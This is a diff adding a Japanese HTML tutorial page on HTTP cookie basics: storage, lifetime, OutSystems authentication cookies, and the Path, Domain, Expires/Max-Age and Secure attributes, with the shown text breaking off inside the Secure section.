@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie 基礎 Lab — Set-Cookie / 属性 / OutSystems認証</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Noto+Sans+JP:wght@300;400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#ffffff; --surface:#f5f7fa; --surface2:#ebeef2; --border:#c8cdd3;
+  --accent:#005cc5; --accent2:#22863a; --accent3:#6f42c1; --accent4:#b08800;
+  --text:#1a1a2e; --text-dim:#5c6370; --code-bg:#f0f4f8;
+  --success:#22863a; --error:#cb2431;
+  --mono:'IBM Plex Mono',monospace; --sans:'Noto Sans JP',sans-serif;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+body { font-family:var(--sans); background:var(--bg); color:var(--text); line-height:1.7; min-height:100vh; padding-left:240px; }
+
+#sidebar { position:fixed; top:0; left:0; bottom:0; width:240px;
+  background:linear-gradient(180deg,#f5f7fa 0%,#ffffff 100%);
+  border-right:1px solid var(--border); overflow-y:auto; padding:14px 0 40px; z-index:50; }
+#sidebar::-webkit-scrollbar { width:4px; }
+#sidebar::-webkit-scrollbar-thumb { background:var(--border); border-radius:2px; }
+#sidebar .nav-title { font-family:var(--mono); font-size:.78rem; color:var(--accent);
+  padding:6px 16px 10px; letter-spacing:.06em; border-bottom:1px solid var(--border); margin-bottom:8px; }
+#sidebar .nav-title span { color:var(--text-dim); }
+#sidebar .nav-section { padding:10px 16px 4px; font-family:var(--mono); font-size:.65rem;
+  color:var(--text-dim); letter-spacing:.15em; text-transform:uppercase; }
+#sidebar .nav-item { display:block; padding:7px 16px 7px 20px; font-size:.82rem;
+  color:var(--text-dim); text-decoration:none; border-left:2px solid transparent;
+  transition:background .15s,color .15s,border-color .15s;
+  white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+#sidebar .nav-item:hover { background:var(--surface2); color:var(--text); }
+#sidebar .nav-item.active { border-left-color:var(--accent);
+  background:rgba(0,92,197,.08); color:var(--accent); font-weight:600; }
+#sidebar .nav-num { font-family:var(--mono); color:var(--accent2);
+  font-size:.72rem; margin-right:8px; opacity:.8; }
+
+.hero { padding:60px 40px 40px; text-align:center;
+  background:linear-gradient(160deg,#f5f7fa 0%,#eef3fa 50%,#ffffff 100%);
+  border-bottom:1px solid var(--border); position:relative; overflow:hidden; }
+.hero::before { content:''; position:absolute; top:-120px; right:-120px;
+  width:400px; height:400px;
+  background:radial-gradient(circle,rgba(0,92,197,.10) 0%,transparent 70%);
+  pointer-events:none; }
+.hero h1 { font-size:2.4rem; font-weight:800; letter-spacing:-1px;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+.hero .subtitle { color:var(--text-dim); font-size:1rem; margin-top:8px; }
+
+.toc { max-width:1100px; margin:32px auto; padding:0 24px; }
+.toc h2 { font-size:1.1rem; color:var(--accent); margin-bottom:12px; font-family:var(--mono); }
+.toc-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:10px; }
+.toc-item { display:flex; align-items:center; gap:10px; padding:10px 14px;
+  background:var(--surface); border:1px solid var(--border); border-radius:8px;
+  text-decoration:none; color:var(--text); font-size:.88rem;
+  transition:border-color .2s,transform .15s; }
+.toc-item:hover { border-color:var(--accent); transform:translateY(-1px); }
+.toc-num { font-family:var(--mono); font-weight:600; color:var(--accent);
+  font-size:.8rem; min-width:28px; }
+
+.container { max-width:1100px; margin:0 auto; padding:0 24px 80px; }
+.lab { margin-top:48px; border:1px solid var(--border); border-radius:12px;
+  overflow:hidden; background:var(--surface); scroll-margin-top:20px; }
+.lab-header { display:flex; align-items:center; gap:12px; padding:18px 24px;
+  background:var(--surface2); border-bottom:1px solid var(--border); }
+.lab-num { font-family:var(--mono); font-weight:600; color:#fff;
+  background:var(--accent); width:30px; height:30px; display:flex;
+  align-items:center; justify-content:center; border-radius:6px; font-size:.85rem; }
+.lab-header h3 { font-size:1.15rem; font-weight:600; }
+.lab-tag { margin-left:auto; font-family:var(--mono); font-size:.72rem;
+  padding:3px 10px; border-radius:20px; border:1px solid; }
+.tag-basic { color:var(--accent); border-color:var(--accent); }
+.tag-intermediate { color:var(--accent2); border-color:var(--accent2); }
+.tag-advanced { color:var(--accent3); border-color:var(--accent3); }
+.lab-body { padding:24px; }
+.lab-desc { font-size:.92rem; color:var(--text-dim); margin-bottom:16px; line-height:1.8; }
+.lab-desc code { font-family:var(--mono); background:var(--code-bg);
+  padding:2px 6px; border-radius:4px; font-size:.84rem; color:var(--accent); }
+
+.code-block { position:relative; background:var(--code-bg);
+  border:1px solid var(--border); border-radius:8px; margin:12px 0; overflow:hidden; }
+.code-block pre { padding:12px 16px 14px; overflow-x:auto;
+  font-family:var(--mono); font-size:.82rem; line-height:1.65;
+  color:var(--text); white-space:pre; tab-size:2; }
+.code-block-header { display:flex; align-items:center; justify-content:space-between;
+  padding:8px 14px; background:var(--surface2); border-bottom:1px solid var(--border);
+  font-family:var(--mono); font-size:.72rem; color:var(--text-dim); letter-spacing:.05em; }
+.copy-btn { background:transparent; border:1px solid var(--border);
+  color:var(--text-dim); font-family:var(--mono); font-size:.7rem;
+  padding:3px 10px; border-radius:4px; cursor:pointer; transition:all .15s; }
+.copy-btn:hover { border-color:var(--accent); color:var(--accent); }
+.copy-btn.copied { border-color:var(--success); color:var(--success); }
+
+.kw { color:#d73a49; } .fn { color:#6f42c1; } .str { color:#032f62; }
+.cm { color:#6a737d; } .num { color:#b08800; } .tag { color:#22863a; }
+.attr { color:#6f42c1; } .val { color:#032f62; } .sel { color:#005cc5; } .prop { color:#22863a; }
+
+.info-box { border-radius:8px; padding:12px 14px 12px 16px; font-size:.88rem;
+  line-height:1.75; margin:14px 0; border-left:3px solid; background:rgba(255,255,255,.02); }
+.info-box.ok   { border-color:var(--success); background:rgba(34,134,58,.08);  color:#154f1e; }
+.info-box.info { border-color:var(--accent);  background:rgba(0,92,197,.08);   color:#003d8f; }
+.info-box.warn { border-color:var(--accent4); background:rgba(176,136,0,.08);  color:#7a5c00; }
+.info-box.err  { border-color:var(--error);   background:rgba(203,36,49,.08);  color:#9a1320; }
+.info-box code { font-family:var(--mono); background:rgba(0,0,0,.06);
+  padding:1px 6px; border-radius:3px; font-size:.82rem; color:var(--accent); }
+
+.verify { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:14px 0; }
+.verify-col { border-radius:7px; padding:11px 14px 13px; font-size:.84rem;
+  line-height:1.7; border:1px solid; }
+.verify-before { background:rgba(203,36,49,.05); border-color:rgba(203,36,49,.25); color:#6b1a22; }
+.verify-after  { background:rgba(34,134,58,.05); border-color:rgba(34,134,58,.25); color:#154f1e; }
+.verify-label { font-family:var(--mono); font-size:.64rem; letter-spacing:.12em;
+  text-transform:uppercase; margin-bottom:5px; font-weight:700; opacity:.85; }
+.verify-before .verify-label { color:var(--error); }
+.verify-after  .verify-label { color:var(--success); }
+
+.check-steps { background:rgba(176,136,0,.06); border:1px solid rgba(176,136,0,.30);
+  border-left:3px solid var(--accent4); border-radius:7px;
+  padding:11px 14px 11px 16px; margin:16px 0 4px;
+  font-size:.86rem; line-height:1.8; color:#5c4400; }
+.check-steps-title { font-family:var(--mono); font-size:.66rem; letter-spacing:.14em;
+  text-transform:uppercase; font-weight:700; color:var(--accent4);
+  margin-bottom:6px; display:flex; align-items:center; gap:6px; }
+.check-steps ol { margin-left:20px; margin-top:2px; }
+.check-steps li { margin-bottom:3px; }
+.check-steps code { font-family:var(--mono); background:rgba(0,0,0,.06);
+  padding:1px 6px; border-radius:3px; font-size:.8rem; color:var(--accent); }
+
+.compare-table { width:100%; border-collapse:collapse; font-size:.84rem;
+  margin:12px 0 16px; background:var(--code-bg); border:1px solid var(--border);
+  border-radius:7px; overflow:hidden; }
+.compare-table th { background:var(--surface2); padding:8px 12px; text-align:left;
+  font-family:var(--mono); font-size:.72rem; color:var(--accent);
+  letter-spacing:.05em; border-bottom:1px solid var(--border); }
+.compare-table td { padding:8px 12px; border-bottom:1px solid var(--border);
+  color:var(--text); vertical-align:top; }
+.compare-table tr:last-child td { border-bottom:none; }
+.compare-table td:first-child { font-family:var(--mono); color:var(--accent2); }
+.compare-table .yes { color:var(--success); font-weight:600; }
+.compare-table .no { color:var(--error); font-weight:600; }
+
+.beginner-box { background:rgba(111,66,193,.06); border:1px solid rgba(111,66,193,.25);
+  border-left:3px solid var(--accent3); border-radius:7px; padding:11px 14px;
+  margin:14px 0; font-size:.86rem; line-height:1.8; color:#3a1d6e; }
+.beginner-title { font-family:var(--mono); font-size:.7rem; letter-spacing:.1em;
+  color:var(--accent3); font-weight:700; margin-bottom:5px; }
+.beginner-box pre.ascii-art { font-family:var(--mono); font-size:.75rem;
+  line-height:1.45; background:rgba(0,0,0,.05); padding:10px 12px; border-radius:5px;
+  margin-top:8px; color:var(--text); overflow-x:auto; }
+
+.usecase-box { background:rgba(111,66,193,.06); border:1px solid rgba(111,66,193,.25);
+  border-left:3px solid var(--accent3); border-radius:7px; padding:12px 14px;
+  margin:14px 0; font-size:.86rem; line-height:1.8; color:#3a1d6e; }
+.usecase-title { font-family:var(--mono); font-size:.7rem; letter-spacing:.1em;
+  color:var(--accent3); font-weight:700; margin-bottom:6px; }
+.usecase-list { margin-left:20px; margin-bottom:10px; }
+.usecase-list li { margin-bottom:4px; }
+.usecase-trigger { background:rgba(0,92,197,.05); border-left:3px solid var(--accent);
+  padding:8px 12px; border-radius:5px; font-size:.82rem; color:#003d8f; margin-top:8px; }
+.usecase-trigger ul { margin:4px 0 0 20px; }
+
+.livedemo { margin:14px 0; border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+.livedemo-bar { display:flex; align-items:center; gap:12px; padding:8px 12px;
+  background:var(--surface2); border-bottom:1px solid var(--border); }
+.toggle-btn { font-family:var(--mono); font-size:.78rem; padding:5px 14px;
+  border-radius:6px; border:1px solid var(--accent); background:var(--accent);
+  color:#fff; cursor:pointer; transition:all .15s; }
+.toggle-btn:hover { opacity:.85; }
+.toggle-btn.is-before { background:var(--error); border-color:var(--error); }
+.toggle-label { font-family:var(--mono); font-size:.78rem; color:var(--text-dim); }
+.livedemo-stage { padding:16px; background:var(--bg); }
+.livedemo-stage.is-before { outline:2px dashed var(--error); outline-offset:-8px; }
+.livedemo-stage .ld-before { display:none; }
+.livedemo-stage.is-before .ld-before { display:block; }
+.livedemo-stage.is-before .ld-after { display:none; }
+.ld-panel { padding:12px; border-radius:6px; font-family:var(--mono); font-size:11px; line-height:1.6; }
+.ld-panel.bad { background:#fee2e2; border:1px solid #cb2431; color:#6b1a22; }
+.ld-panel.good { background:#dcfce7; border:1px solid #22863a; color:#166534; }
+
+.try-box { background:rgba(34,134,58,.06); border:1px solid rgba(34,134,58,.30);
+  border-left:3px solid var(--success); border-radius:7px;
+  padding:12px 14px; margin:14px 0; font-size:.86rem; line-height:1.8; color:#154f1e; }
+.try-title { font-family:var(--mono); font-size:.7rem; letter-spacing:.1em;
+  color:var(--success); font-weight:700; margin-bottom:6px; }
+.try-box ol { margin-left:20px; margin-top:4px; }
+.try-box ol li { margin-bottom:4px; }
+.try-box code { font-family:var(--mono); background:rgba(0,0,0,.06);
+  padding:1px 6px; border-radius:3px; font-size:.82rem; color:var(--success); }
+.try-tip { background:rgba(176,136,0,.06); border-left:3px solid var(--accent4);
+  padding:8px 12px; border-radius:5px; font-size:.82rem; color:#5c4400; margin-top:8px; }
+.try-tip strong { color:var(--accent4); }
+.try-skeleton { background:#f0f4f8; border:1px solid var(--border); border-radius:5px;
+  padding:10px 12px; margin-top:8px; font-family:var(--mono); font-size:.78rem;
+  color:var(--text); white-space:pre; overflow-x:auto; line-height:1.5; }
+
+.code-pair { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin:14px 0; }
+.code-pair-col { display:flex; flex-direction:column; min-width:0; }
+.code-pair-label { font-family:var(--mono); font-size:.72rem; letter-spacing:.05em;
+  font-weight:700; padding:6px 10px; border-radius:6px 6px 0 0; }
+.code-pair-before .code-pair-label { background:rgba(203,36,49,.10); color:#9a1320;
+  border:1px solid rgba(203,36,49,.30); border-bottom:none; }
+.code-pair-after  .code-pair-label { background:rgba(34,134,58,.10); color:#154f1e;
+  border:1px solid rgba(34,134,58,.30); border-bottom:none; }
+.code-pair-col .code-block { margin:0; border-radius:0 0 8px 8px; flex:1; }
+.code-pair-before .code-block { border-color:rgba(203,36,49,.30); }
+.code-pair-after  .code-block { border-color:rgba(34,134,58,.30); }
+@media (max-width:900px){ .code-pair { grid-template-columns:1fr; } }
+
+@media (max-width:900px) {
+  body { padding-left:0; }
+  #sidebar { position:static; width:100%; height:auto; border-right:none;
+    border-bottom:1px solid var(--border); padding:8px 0; }
+  #sidebar .nav-item { padding:6px 14px; font-size:.78rem; }
+  .verify { grid-template-columns:1fr; }
+  .hero h1 { font-size:1.6rem; }
+  .toc-grid { grid-template-columns:1fr; }
+}
+</style>
+</head>
+<body>
+
+<nav id="sidebar" aria-label="Lab navigation">
+  <div class="nav-title">// Cookie Basics <span>v1</span></div>
+  <div class="nav-section">基本</div>
+  <a class="nav-item" href="#lab0"><span class="nav-num">00</span>Cookie保存場所</a>
+  <a class="nav-item" href="#lab1"><span class="nav-num">01</span>セッション/永続</a>
+  <a class="nav-item" href="#lab2"><span class="nav-num">02</span>OutSystemsのCookie</a>
+  <div class="nav-section">属性</div>
+  <a class="nav-item" href="#lab3"><span class="nav-num">03</span>Path 属性</a>
+  <a class="nav-item" href="#lab4"><span class="nav-num">04</span>Domain 属性</a>
+  <a class="nav-item" href="#lab5"><span class="nav-num">05</span>Expires/Max-Age</a>
+  <a class="nav-item" href="#lab6"><span class="nav-num">06</span>Secure 属性</a>
+  <a class="nav-item" href="#lab7"><span class="nav-num">07</span>HttpOnly 属性</a>
+  <a class="nav-item" href="#lab8"><span class="nav-num">08</span>SameSite 属性</a>
+  <div class="nav-section">構文ルール</div>
+  <a class="nav-item" href="#lab9"><span class="nav-num">09</span>ヘッダ構文</a>
+  <a class="nav-item" href="#lab10"><span class="nav-num">10</span>複数行と後勝ち</a>
+  <div class="nav-section">設計思想</div>
+  <a class="nav-item" href="#lab11"><span class="nav-num">11</span>識別/認証の分離</a>
+</nav>
+
+<div class="hero">
+  <h1>Cookie 基礎 Lab</h1>
+  <p class="subtitle">Set-Cookie / 各属性 / OutSystems認証Cookie / 設計思想を実機で確認する</p>
+</div>
+
+<div class="toc">
+  <h2>// 目次</h2>
+  <div class="toc-grid">
+    <a class="toc-item" href="#lab0"><span class="toc-num">00</span>Cookieはどこに保存されるか</a>
+    <a class="toc-item" href="#lab1"><span class="toc-num">01</span>セッションCookie vs 永続Cookie</a>
+    <a class="toc-item" href="#lab2"><span class="toc-num">02</span>OutSystemsの代表Cookie</a>
+    <a class="toc-item" href="#lab3"><span class="toc-num">03</span>Path 属性</a>
+    <a class="toc-item" href="#lab4"><span class="toc-num">04</span>Domain 属性</a>
+    <a class="toc-item" href="#lab5"><span class="toc-num">05</span>Expires / Max-Age 属性</a>
+    <a class="toc-item" href="#lab6"><span class="toc-num">06</span>Secure 属性</a>
+    <a class="toc-item" href="#lab7"><span class="toc-num">07</span>HttpOnly 属性</a>
+    <a class="toc-item" href="#lab8"><span class="toc-num">08</span>SameSite 属性</a>
+    <a class="toc-item" href="#lab9"><span class="toc-num">09</span>Set-Cookie / Cookie ヘッダ構文</a>
+    <a class="toc-item" href="#lab10"><span class="toc-num">10</span>複数行のSet-Cookieと後勝ち</a>
+    <a class="toc-item" href="#lab11"><span class="toc-num">11</span>識別と認証の分離設計</a>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- ============ Lab 00 ============ -->
+<div class="lab" id="lab0">
+  <div class="lab-header">
+    <div class="lab-num">00</div>
+    <h3>Cookieはどこに保存されるか</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      サーバから届いた <code>Set-Cookie</code> はブラウザの <strong>Cookie ストア（Cookie Jar）</strong>に保存される。物理的にはブラウザごとのSQLite等のファイルだが、ブラウザは <code>(Name, Domain, Path)</code> でCookieを管理し、リクエスト時に自動で <code>Cookie</code> ヘッダに載せて送る。
+    </p>
+
+    <div class="beginner-box">
+      <div class="beginner-title">🔰 Cookie ストアのイメージ</div>
+<pre class="ascii-art">ブラウザ
+└── Cookie ストア（Cookie Jar）
+    ├── example.com 用のCookie
+    │   ├── sessionId=abc123  (HttpOnly, Secure)
+    │   └── theme=dark
+    └── other.com 用のCookie
+        └── lang=ja
+
+物理: Chrome → Cookies (SQLite)
+      Firefox → cookies.sqlite</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — サーバ→ブラウザ→次回リクエスト</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// [1回目] サーバが Set-Cookie で発行</span>
+HTTP/1.1 200 OK
+Set-Cookie: sessionId=abc123; Path=/; HttpOnly
+
+<span class="cm">// [保存] ブラウザの Cookie Jar に格納</span>
+
+<span class="cm">// [2回目以降] ブラウザが自動で Cookie ヘッダに載せる</span>
+GET /home HTTP/1.1
+Cookie: sessionId=abc123</pre>
+    </div>
+
+    <div class="info-box info">
+      📘 <strong>セッションCookieは「メモリ」、永続Cookieは「ディスク」</strong>に保存される。<code>Expires</code>/<code>Max-Age</code> 属性が指定されていればディスク（永続）、なければメモリ（セッション）扱い。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 01 ============ -->
+<div class="lab" id="lab1">
+  <div class="lab-header">
+    <div class="lab-num">01</div>
+    <h3>セッションCookie vs 永続Cookie</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      Cookieは寿命によって2種類に分かれる。<code>Expires</code>/<code>Max-Age</code> の<strong>有無</strong>だけで決まる。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>項目</th><th>セッションCookie</th><th>永続Cookie</th></tr></thead>
+      <tbody>
+        <tr><td>保存場所</td><td>メモリ</td><td>ディスク</td></tr>
+        <tr><td>寿命</td><td>ブラウザ閉じるまで</td><td>指定日時まで</td></tr>
+        <tr><td>属性</td><td>指定なし</td><td>Expires または Max-Age 指定</td></tr>
+        <tr><td>典型用途</td><td>認証セッションID</td><td>Remember Me / テーマ設定</td></tr>
+        <tr><td>セキュリティ</td><td class="yes">高（短命）</td><td class="no">中（漏洩窓が長い）</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-pair">
+      <div class="code-pair-col code-pair-before">
+        <div class="code-pair-label">セッションCookie（属性なし）</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — ブラウザ閉じたら消える</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: sessionId=abc123; Path=/; HttpOnly
+
+<span class="cm">// → メモリ保存</span>
+<span class="cm">// → ブラウザ終了で消滅</span></pre>
+        </div>
+      </div>
+      <div class="code-pair-col code-pair-after">
+        <div class="code-pair-label">永続Cookie（Expires/Max-Age あり）</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — ディスクに残る</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: rememberMe=xyz; Max-Age=2592000
+Set-Cookie: theme=dark; Expires=Wed, 31 Dec 2026 23:59:59 GMT
+
+<span class="cm">// → ディスク保存</span>
+<span class="cm">// → 指定期間まで残る</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box warn">
+      ⚠️ 最近のChrome/Firefoxは「前回のタブを開く」設定だとセッションCookieも復元する場合がある。サーバ側のセッション無効化（DB側で <code>Expires</code> 管理）に頼る方が確実。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 02 ============ -->
+<div class="lab" id="lab2">
+  <div class="lab-header">
+    <div class="lab-num">02</div>
+    <h3>OutSystemsの代表的なCookie</h3>
+    <span class="lab-tag tag-intermediate">中級</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      OutSystemsプラットフォームは<strong>識別と認証を別Cookieに分離</strong>している。これが安全設計の鍵。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>Cookie名</th><th>種類</th><th>役割</th></tr></thead>
+      <tbody>
+        <tr><td>osVisitor</td><td>永続（1年）</td><td>訪問者を一意に識別。分析・運用ログの主キー</td></tr>
+        <tr><td>osVisit</td><td>セッション</td><td>1回の訪問（ブラウザ起動中）を識別</td></tr>
+        <tr><td>nr1Users</td><td>永続</td><td>Remember Me 用ログイン識別子</td></tr>
+        <tr><td>nr2Users</td><td>セッション</td><td>認証済みセッショントークン（HttpOnly+Secure）</td></tr>
+        <tr><td>.ASPXAUTH</td><td>場合による</td><td>ASP.NET Forms認証チケット</td></tr>
+      </tbody>
+    </table>
+
+    <div class="beginner-box">
+      <div class="beginner-title">🔰 ライフサイクルのイメージ</div>
+<pre class="ascii-art">[初回アクセス]
+  → osVisitor 発行（永続: 1年） ─── 以後ずっと同じ訪問者として識別
+  → osVisit 発行（セッション）   ─── ブラウザ閉じるまで
+
+[ログイン]
+  → nr2Users 発行（セッション）  ─── 認証セッショントークン
+  → "ログイン状態を保持"ON の場合
+     nr1Users 発行（永続）       ─── 次回起動時に自動ログイン
+
+[ブラウザ終了]
+  osVisit / nr2Users     → 消滅
+  osVisitor / nr1Users   → ディスクに残存
+
+[次回起動]
+  osVisitor で「同じ訪問者」と認識
+  nr1Users があれば自動ログイン → 新しい nr2Users を発行</pre>
+    </div>
+
+    <div class="info-box info">
+      📘 <strong>分離設計のポイント</strong>: 「価値の高いもの（=認証）ほど短命に」。<code>nr2Users</code> はブラウザ閉じれば消えるため、漏洩しても被害ウィンドウが狭い。<code>osVisitor</code> 単体ではログインできないので長期保持しても被害は小さい。
+    </div>
+
+    <div class="info-box warn">
+      ⚠️ <strong>osVisitor は本当に必要か？</strong> アプリの業務ロジックでは不要。OutSystemsの<strong>分析・運用機能</strong>（Service Center / LifeTime / GetCurrentVisitorId 等）の主キーとして使われている。社内業務システムなど分析が重要でない場面では、削除や短期化を選ぶ設計も合理的。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 03 ============ -->
+<div class="lab" id="lab3">
+  <div class="lab-header">
+    <div class="lab-num">03</div>
+    <h3>Path 属性 — どのURLパスに送るか</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      Cookie を <strong>どのパス配下のリクエストに自動付与するか</strong>を制御する。指定しなければ <code>/</code> 相当。
+    </p>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — Path指定の挙動</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: adminToken=xxx; Path=/admin
+
+<span class="cm">// 送信される/されない</span>
+GET /admin/users   → Cookie 送信 ✓
+GET /admin         → Cookie 送信 ✓
+GET /api/data      → Cookie 送信 ✗
+GET /              → Cookie 送信 ✗</pre>
+    </div>
+
+    <table class="compare-table">
+      <thead><tr><th>Path指定</th><th>送信対象</th><th>用途</th></tr></thead>
+      <tbody>
+        <tr><td>Path=/</td><td>サイト全体</td><td>最も一般的（OutSystems標準）</td></tr>
+        <tr><td>Path=/admin</td><td>/admin 配下のみ</td><td>管理画面のCookie分離</td></tr>
+        <tr><td>Path=/api/v2</td><td>/api/v2 配下のみ</td><td>APIバージョン別の分離</td></tr>
+      </tbody>
+    </table>
+
+    <div class="livedemo">
+      <div class="livedemo-bar">
+        <button class="toggle-btn" data-target="ld-path">分離設計を見る</button>
+        <span class="toggle-label" id="ld-path-label">現在: After（推奨: Path=/ で統一）</span>
+      </div>
+      <div class="livedemo-stage" id="ld-path">
+        <div class="ld-panel good ld-after">
+          ✓ After: Path=/ で全アプリ共通の認証Cookie<br>
+          複数アプリ間でセッション共有可能
+        </div>
+        <div class="ld-panel bad ld-before">
+          ✗ Before: アプリ毎に Path=/AppA, Path=/AppB<br>
+          → 同名Cookie が両方残り、サーバ側で混乱<br>
+          → 「ログインしたはずなのにログイン状態にならない」事故
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 04 ============ -->
+<div class="lab" id="lab4">
+  <div class="lab-header">
+    <div class="lab-num">04</div>
+    <h3>Domain 属性 — どのドメインに送るか</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      Cookie を送る対象ドメインの範囲を指定。指定なしなら<strong>発行ホストのみ</strong>に限定される（サブドメインにすら送らない）。
+    </p>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — Domain指定の挙動</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="cm">// [属性なし] app.example.com から発行</span>
+Set-Cookie: token=xxx; Path=/
+
+  app.example.com    → 送信 ✓
+  www.example.com    → 送信 ✗  ← サブドメインにすら送らない
+
+<span class="cm">// [Domain=example.com] サブドメイン全部に送る</span>
+Set-Cookie: token=xxx; Path=/; Domain=example.com
+
+  app.example.com    → 送信 ✓
+  www.example.com    → 送信 ✓
+  api.example.com    → 送信 ✓
+  other.com          → 送信 ✗</pre>
+    </div>
+
+    <div class="info-box err">
+      🚨 <strong>セキュリティルール</strong>: 自ドメインの上位や他ドメインに <code>Domain</code> を設定してもブラウザに拒否される。<code>evil.com</code> から <code>Domain=google.com</code> のCookieは発行不可能。
+    </div>
+
+    <div class="info-box info">
+      📘 <strong>使い分け</strong>: 単一サイトなら指定なしが最もセキュア。複数サブドメインで認証共有したいときだけ <code>Domain=example.com</code> 形式を使う。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 05 ============ -->
+<div class="lab" id="lab5">
+  <div class="lab-header">
+    <div class="lab-num">05</div>
+    <h3>Expires / Max-Age 属性 — 寿命の指定</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      Cookieの寿命を指定する2つの方法。<strong>両方とも指定するとMax-Ageが優先</strong>される（仕様上）。
+    </p>
+
+    <table class="compare-table">
+      <thead><tr><th>属性</th><th>形式</th><th>特徴</th></tr></thead>
+      <tbody>
+        <tr><td>Expires</td><td>絶対時刻（GMT）</td><td>クライアント時刻ずれの影響を受ける。古いブラウザ互換</td></tr>
+        <tr><td>Max-Age</td><td>相対秒数</td><td>時刻ずれに強い。仕様上優先される</td></tr>
+        <tr><td>Max-Age=0</td><td>即削除</td><td>Cookie削除のテクニック</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-pair">
+      <div class="code-pair-col code-pair-before">
+        <div class="code-pair-label">Expires（絶対時刻）</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 古い形式</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: theme=dark;
+  Expires=Wed, 31 Dec 2026 23:59:59 GMT
+
+<span class="cm">// 値の中にカンマ・スペース・コロン</span>
+<span class="cm">// → 1行1Cookie ルールが必要な理由</span></pre>
+        </div>
+      </div>
+      <div class="code-pair-col code-pair-after">
+        <div class="code-pair-label">Max-Age（相対秒数 / 推奨）</div>
+        <div class="code-block">
+          <div class="code-block-header"><span>HTTP — 推奨形式</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: theme=dark; Max-Age=2592000
+
+<span class="cm">// 30日間 (2592000秒)</span>
+<span class="cm">// 時刻ずれに強い</span>
+
+<span class="cm">// Cookie削除</span>
+Set-Cookie: theme=; Max-Age=0</pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-box warn">
+      ⚠️ <strong>削除の落とし穴</strong>: 削除時は発行時とまったく同じ <code>Path</code>/<code>Domain</code> を指定する必要がある。違うと「古い方は残ったまま、新しい空Cookieが追加される」事故になる。
+    </div>
+  </div>
+</div>
+
+<!-- ============ Lab 06 ============ -->
+<div class="lab" id="lab6">
+  <div class="lab-header">
+    <div class="lab-num">06</div>
+    <h3>Secure 属性 — HTTPSのみで送信</h3>
+    <span class="lab-tag tag-basic">基本</span>
+  </div>
+  <div class="lab-body">
+    <p class="lab-desc">
+      <code>Secure</code> 付きのCookieは<strong>HTTPSリクエストでのみ送信</strong>される。HTTP（平文）リクエストでは送られない。
+    </p>
+
+    <div class="code-block">
+      <div class="code-block-header"><span>HTTP — Secure属性の挙動</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>Set-Cookie: sessionId=xxx; Secure; HttpOnly
+
+  https://example.com/   → Cookie 送信 ✓
+  http://example.com/    → Cookie 送信 ✗  <span class="cm">// 平文では送らない</span>
+
+<span class="cm">// Secureなしの場合</span>
+Set-Cookie: theme=dark
+
+  https://example.com/   → Cookie 送信 ✓
+  http://example.com/    → Cookie 送信 ✓  <span class="cm">// 平文でも送る = 盗聴リスク</span></pre>
+    </div>
+
+    <div class="info-box err">
+      🚨 <strong>認証Cookieには必ず <code>Secure</code> を付ける</strong>。これがないと、公衆Wi-Fiなどで中間者攻撃により Cookie が盗聴される。
+    </div>
+
+    <div class="usecase-box">
+      <div class="usecase-title">💡 利用シーン</div>
+      <ul class="usecase-list">
+        <li>ログインセッションID（<code>nr2Users</code>、<code>JSESSIONID</code> 等）</li>
+        <li>CSRFトークン</li>
+        <li>個人情報を含む全てのCookie</li>
+        <li>本番環境ではほぼ全Cookieに付ける</li>
+      </ul>
+      <div class="usecase-trigger">
+        <strong>こう見えたら付け忘れの可能性:</strong>
